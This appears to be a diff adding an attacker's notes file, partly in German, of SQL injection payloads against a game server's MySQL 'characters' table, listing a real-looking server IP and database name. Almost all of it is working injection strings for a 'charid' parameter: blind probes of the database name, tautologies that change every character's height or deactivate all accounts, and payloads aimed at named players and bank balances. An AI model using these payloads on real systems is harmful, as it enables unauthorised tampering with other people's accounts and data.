@@ -1,0 +1,99 @@
+Could not connect to server: 91.121.137.31.
+Can't connect to MySQL server on '91.121.137.31' (104)
+
+Could not open database: owl_mta.
+
+
+
+MySQL Query fail: UPDATE `characters` SET `height`='', `weight`='' WHERE id='4535';
+
+
+MySQL Query fail: SELECT `name`, `rank_` FROM `factions` WHERE `id`=''
+Unknown column 'rank_' in 'field list'
+
+
+intid=530&charid=4066
+
+
+
+SELECT * FROM `characters` WHERE id='4535'' AND `account`='2858'
+SELECT `name`, `rank_` FROM `factions` WHERE `id`=''
+
+
+
+UPDATE `characters` SET `height`='150\'', `weight`='70' WHERE id='4066';
+
+',`age`='20'
+&ageval=20
+
+' OR EXISTS(SELECT 1 FROM dual WHERE database() LIKE '%w%') AND ''='
+
+
+' OR EXISTS(SELECT * FROM `characters` WHERE name LIKE '%e%') AND ''='
+
+
+
+
+
+
+
+SELECT * FROM `characters` WHERE id='4535'' AND `account`='2858'
+
+4535 ronald
+4066 Dennus
+
+
+charid=4066' AND `bankmoney`='1426' -- 
+
+' AND `bankmoney`='9426' -- 
+
+' AND `age`='20'
+
+UPDATE `characters` SET `age`='20' WHERE id='4066';
+
+charid=4066' OR '4535';-- UPDATE `characters` SET `age`='20' WHERE id='4066&active=1
+
+
+____________________________________________________________________________________________
+
+ACCS Checken:
+
+charid=1249' OR '4535
+
+charid=4066' OR '4535 SET `age`='20&heightval=251&weighteval=104
+
+charid=4066' OR '(SELECT * FROM characters WHERE id = 4066 )
+
+charid=0' OR '=(SELECT * FROM `characters` WHERE `id` = 4535 )&heightval=258&weighteval=105
+
+
+(SELECT `charactername` FROM `characters` WHERE `id` = 4535 )
+OUTPUT
+____________________________________________________________________________________________
+
+ALLE Größe ämdern:
+
+charid=0' OR '3&heightval=201&weighteval=105
+
+____________________________________________________________________________________________
+
+ALLE Chrakter deaktiviewn:
+
+charid=0' OR '3&active=1
+
+____________________________________________________________________________________________
+
+Chrakter deaktiviewn per name:
+charid=0' OR `charactername` = "Anatoly_Bylov" OR '&active=0
+
+UPDATE `characters` SET `active`='0' WHERE id='0' OR `charactername` = "Anatoly_Bylov" OR '';
+____________________________________________________________________________________________
+Leute auslese per name:
+
+charid=0' OR `charactername` = "Michael_Duffy" OR '
+____________________________________________________________________________________________
+
+
+(UPDATE `characters` SET `age` = 20 Where `id` = 4535 )
+
+
